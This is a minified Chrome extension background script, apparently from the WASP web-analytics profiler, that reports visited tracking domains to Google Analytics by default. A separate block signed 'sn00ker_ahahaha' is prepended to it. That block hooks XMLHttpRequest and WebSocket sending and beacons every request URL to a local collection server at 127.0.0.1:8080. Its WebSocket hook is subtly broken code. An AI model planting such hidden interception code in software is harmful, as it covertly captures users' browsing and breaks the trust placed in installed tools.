function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function bypassListener(e){var s,a,t,o=e.url.split(/#|\?/)[0],n=e.tabId;if(lastBypassId===e.requestId)return{};if(2&bypassing||n in trackedTabs)if("main_frame"===e.type)bypassTabs[n]={id:n,url:o,domain:o.replace(/^http(s)?:\/\//,"").split("/",2)[0]};else if(n=bypassTabs[n])for(s=cql.select("bypass",'url="'+o+'"',"tab desc,scope,type [override|block]"),t=s.length;t--;)if(a=s[t],"hide"!=a.type&&("0all"===a.tab||"0tracked"===a.tab&&n.id in trackedTabs||a.tab in trackedTabs)&&("4"===a.scope||"2"===a.scope&&-1!==n.domain.indexOf(a.scopeUrl)||a.scopeUrl===n.url)){if(lastBypassId=e.requestId,"override"===a.type)return trackedTabs[n.id].postMessage({"msg-type":"url-override",overrideCall:e.url,"with":a.overrideUrl,method:e.method,requestBody:e.requestBody}),{redirectUrl:a.overrideUrl};if("block"===a.type)return trackedTabs[n.id].postMessage({"msg-type":"url-block",blockedCall:e.url,method:e.method,requestBody:e.requestBody}),{cancel:!0}}}function usageListener(e){var a=e.url.split(/#|\?/)[0],t=e.tabId,o=a.replace(/^http(s)?:\/\//,"").split("/"),n=o.shift().replace(/www\./,""),r=n,i="",l=usageTabs[t],c=Date.now(),p=localStorage.optOut+""=="false",d="";if(lastUsageId!==e.requestId&&n.match(/(?=^.{1,254}$)(^([a-zA-Z0-9_\-]{1,63}\.?)+(?:[a-zA-Z]{2,})$)/)){if(p&&(lastUsageId=e.requestId),"main_frame"===e.type){cql.delete("popup","tab="+t),l&&l.domain===n?(l.action="ignore",l.count=0):(l=usageTabs[t]={id:t,url:a,domain:n,action:!p||usageDomains[n]?"ignore":"track",tags:[],count:0},usageDomains[n]=!0);var u=cql.select("ignore-tags",'url="'+l.url+'"||url="'+l.domain+'"',"type")||[];l["ignore-tags"]=u.length?u[0].type:!1,chrome.browserAction.setBadgeText({text:"",tabId:t})}else if(l){var g=n.split(".").reverse(),b="n/a";if(n=g.slice(0,2!==g[0].length||"co"!==g[1]&&"ac"!==g[1]?2:3).reverse().join("."),(s=e.url.match(/(google-analytics|doubleclick).*\/__utm.gif.*[&?]utmwv=([^&]+)/))?(n+="/ga",b=s[2],i=e.url.match(/[&?]utmac=([^&]+)/)[1]):(s=e.url.match(/(google-analytics|doubleclick).*\/collect.*[&?]v=([^&]+)/))?(n+="/ua",b=s[2],i=e.url.match(/[&?]tid=([^&]+)/)[1]):(s=e.url.match(/2o7.net(?:\/[^/]+)*\/([^/]+)\/s\d+\?/))?(n+="/2o7",b=s[1],i=" "):(s=e.url.match(/\/([^/]+)\/s\d+\?AQB=/))&&(n+="/2o7",b=s[1],i=" "),n!==l.domain.match(/[^\.]+/)[0]&&("track"!==l.action||l.tags[n]||(usageBuffer.push({"for-site":l.domain,"request-domain":n,payload:b}),l.tags[n]=!0),!l["ignore-tags"]&&"image"===e.type&&(e.url.match(/\?(.+)/)||[]).length)){chrome.browserAction.setBadgeText({text:++l.count+"",tabId:t});do d="/"+(o.pop()||"")+d;while(1==d.length&&o.length);var m="tab="+t+',domain="'+r+'",file="'+d+'",special="'+i+'"',y=cql.select("popup",m);y.length?cql.update("popup","count="+(Number(y[0].count)+1),m):cql.insert("popup","type=image,bypass=false,"+m+",count=1")}}c>=flushDomains&&(usageDomains={},flushDomains=c+1728e5)}}chrome.runtime.onInstalled.addListener(function(e){var s=chrome.runtime.getManifest().version;"install"===e.reason?(localStorage.panelOption="install="+s,ga("send","event","install","first",s),localStorage.optOut="false",localStorage.userType="Implementer",window.open("http://WebAnalyticsSolutionProfiler.com/chrome/installed/?utm_source=plugin&utm_medium=chrome&utm_campaign=wasp&v="+s)):"update"===e.reason&&e.previousVersion!==s&&(localStorage.panelOption="upgrade="+e.previousVersion,localStorage.userType="Implementer",ga("send","event","install","update",s),s.match(/^(\d+\.\d+)/)[1]!=e.previousVersion.match(/^(\d+\.\d+)/)[1]&&window.open("http://WebAnalyticsSolutionProfiler.com/chrome/updated/?utm_source=plugin&utm_medium=chrome&utm_campaign=wasp&v="+s))});var trackedTabs={},bypassTabs={},usageTabs={},usageDomains={},usageBuffer=[],flushDomains=Date.now()+1728e5,newSession=!0,bypassing=!1,lastBypassId,lastUsageId,popup=null,cql=new CSSql;cql.define("popup",'type,bypass="",tab,domain,file,special="",count'),cql.define("ignore-tags","type,url"),cql.load("ignore-tags",CSSql.SCOPE_LOCAL),cql.define("bypass","type,url,tab,isDomain=false,scope=page,scopeUrl,duration=session,override,overrideUrl"),cql.append("bypass",CSSql.SCOPE_LOCAL,"always"),cql.delete("type=hide"),chrome.webRequest.onHeadersReceived.addListener(usageListener,{urls:["<all_urls>"],types:["main_frame","image","script"]}),ga("create","UA-22022050-14","auto",{name:"hive",alwaysSendReferrer:!1,allowAnchor:!1}),ga("hive.set","checkProtocolTask",function(){}),window.setInterval(function(){for(var e=chrome.runtime.getManifest().version,s=Math.min(20,usageBuffer.length);s--;){var a=usageBuffer.shift();ga("hive.send","pageview",{hostname:a["for-site"],page:"/"+a["request-domain"],dimension1:a.payload,dimension2:e,title:a["request-domain"],useBeacon:!0})}},3e4),devtoolMessages=new MessageDeligate,devtoolMessages.addListener("tab-tracking",function(e,s,a){e.startTabTracking?(trackedTabs[e.startTabTracking]=a,a.tracking=e.startTabTracking,a.postMessage({"msg-type":"connection","connection-success":!0,"new-session":newSession}),newSession=!1):e.stopTabTracking&&(delete trackedTabs[e.stopTabTracking],bypassing&&(cql.delete("bypass","tab="+a.tracking),0===cql.count("bypass","*")&&(chrome.webRequest.onBeforeRequest.removeListener(bypassListener),bypassing=0)))}),devtoolMessages.addListener("open-tab",function(e){chrome.tabs.create({url:e.uri,active:!0},function(e){chrome.windows.update(e.windowId,{focused:!0})})}),devtoolMessages.addListener("bypass",function(e){"override"===e.action&&cql.delete("bypass","*");for(var s=e.bypassData.length;s--;cql.insert("bypass",e.bypassData[s]));var a=cql.count("bypass","*");a&&!bypassing?(bypassing=1,chrome.webRequest.onBeforeRequest.addListener(bypassListener,{urls:["<all_urls>"]},["blocking"])):!a&&bypassing&&(bypassing=0,chrome.webRequest.onBeforeRequest.removeListener(bypassListener)),bypassing&&cql.count("bypass","tab^=all")&&(bypassing=3)}),devtoolMessages.addListener("get-friendly",function(e,s,a){a.postMessage({"msg-type":"set-friendly","set-friendly":friendly})}),chrome.runtime.onConnect.addListener(function(e){var s=(e.name.match(/^WASP.devtool-([0-9]+)$/)||[]).pop(),a=(e.name.match(/^WASP.popup-([0-9]+)$/)||[]).pop();s?(e.id=s,e.onMessage.addListener(function(s,a){s["msg-type"]?devtoolMessages.fireListener(s["msg-type"],s,a,e):console.log("unexpected devtool message recieved",s,e)}),e.onDisconnect.addListener(function(){delete trackedTabs[e.id],bypassing&&(cql.delete("bypass","tab="+e.id),0===cql.count("bypass","*")&&(chrome.webRequest.onBeforeRequest.removeListener(bypassListener),bypassing=0))})):a?(e.id=a,popup=e,e.onMessage.addListener(function(s){var a=Number(e.id),t=usageTabs[a]?usageTabs[a]["ignore-tags"]:!1;switch(s["msg-type"]){case"get-tags":e.postMessage({"msg-type":"set-tags","tag-list":cql.select("popup","tab="+a,"bypass,type,special desc,domain,page"),"ignore-tags":t});break;case"ignore-tags":var o=s["track-level"],n="type="+o+',url="'+("page"==o?usageTabs[a].url:usageTabs[a].domain)+'"';cql.count("ignore-tags",n)||(cql.insert("ignore-tags",n),cql.save("ignore-tags",CSSql.SCOPE_LOCAL));case"clear-tags":cql.delete("popup","tab="+a),chrome.browserAction.setBadgeText({text:"",tabId:a}),usageTabs[a]&&(usageTabs.count=0);break;case"track-tags":var n='type=page,url="'+usageTabs[a].url+'"';"domain"==s["track-level"]&&(n+='||type=domain,url="'+usageTabs[a].domain+'"'),usageTabs[a]["ignore-tags"]=!1,cql.delete("ignore-tags",n),cql.save("ignore-tags",CSSql.SCOPE_LOCAL);break;default:console.log("unknown popup message",s)}}),e.onDisconnect.addListener(function(){popup=null})):console.log("unexpected port request",e)});var tabMessages=new MessageDeligate;tabMessages.addListener("track-tab",function(e,s,a){a.tab&&trackedTabs[a.tab.id]?s(a.tab.id):s(!1)}),tabMessages.setDefault(function(e,s,a){trackedTabs[a.tab.id]?(trackedTabs[a.tab.id].postMessage(e),s&&s(!0)):s&&s(!1)}),chrome.runtime.onMessage.addListener(function(e,s,a){e["msg-type"]&&tabMessages.fireListener(e["msg-type"],e,a,s)});